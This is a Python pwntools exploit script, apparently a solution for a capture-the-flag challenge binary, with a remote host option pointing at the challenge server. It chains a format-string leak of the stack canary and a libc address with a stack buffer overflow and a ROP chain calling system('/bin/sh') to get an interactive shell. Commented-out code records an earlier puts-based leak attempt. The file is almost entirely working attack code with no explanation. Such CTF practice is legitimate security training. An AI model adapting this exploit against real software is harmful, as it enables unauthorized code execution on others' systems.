#!/usr/bin/python3
import pwn
pwn.context.terminal = ['tmux','splitw','-h']

elf = pwn.context.binary =pwn.ELF("./chall")
# 15 - canary
# 17 - rip
# 19 - libc
if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path,gdbscript='b *0x0000000000401272\nc\n')
    libc = pwn.ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
elif pwn.args.REMOTE:
    io = pwn.remote("chall.nitdgplug.org",30095)
    libc = pwn.ELF("./libc.so.6")
else:
    io = elf.process()
    libc = pwn.ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

addr = pwn.p64(0x00000000004031e0)
payload = b'%15$p.%19$p.%4601x%9$hn'
payload += (8 - (len(payload) % 8))*b'C'
payload += addr
# payload += (88 - len(payload))*b'Z'

# payload2 = b'B'*124
# payload += payload2
io.recvuntil(b'|\n')
io.sendline(payload)
canary = int(io.recvuntil(b'.',drop=True),16)
libc_leak = int(io.recvuntil(b'.',drop=True),16)
pwn.log.info("Canary leak : "+hex(canary))
pwn.log.info("Libc leak : "+hex(libc_leak))
libc.address = libc_leak - 243 - libc.sym['__libc_start_main']
pwn.log.success("Libc Base: "+hex(libc.address))
io.recvuntil(b'|\n')
# pop_rdi = 0x0000000000401313
payload = b'A'*72
payload += pwn.p64(canary)
payload += pwn.p64(0xdeadbeef)
ret_addr = 0x000000000040101a
rop = pwn.ROP(libc)
rop.raw(ret_addr)
bin_sh = next(libc.search(b'/bin/sh'))
rop.system(bin_sh)
payload += rop.chain()
io.sendline(payload)
# payload += pwn.p64(pop_rdi)
# payload += pwn.p64(elf.got['printf'])
# payload += pwn.p64(elf.plt['puts'])
# payload += pwn.p64(elf.sym['vuln'])
# io.sendline(payload)
# print(io.recv(72))
# puts_leak = pwn.unpack(io.recvline().strip(),'all')
# print("PRINTF_LEAK : "+hex(puts_leak))
# # libc.address = puts_leak - libc.sym['puts']
# # pwn.log.success("LIBC BASE : "+hex(libc.address))
# io.recvuntil(b"|\n")
# payload = b'A'*72
# payload += pwn.p64(canary)
# payload += pwn.p64(0xdeadbeef)
# payload += pwn.p64(pop_rdi)
# payload += pwn.p64(elf.got['puts'])
# payload += pwn.p64(elf.plt['puts'])
# payload += pwn.p64(elf.sym['vuln'])
# # ret_addr = 0x000000000040101a

# # rop = pwn.ROP(libc)
# # rop.raw(ret_addr)
# # bin_sh = next(libc.search(b'/bin/sh'))
# # rop.system(bin_sh)
# # payload += rop.chain()
# io.sendline(payload)
# print(io.recv(72))
# puts_leak = pwn.unpack(io.recvline().strip(),'all')
# print("PUTS_LEAK : "+hex(puts_leak))
io.interactive()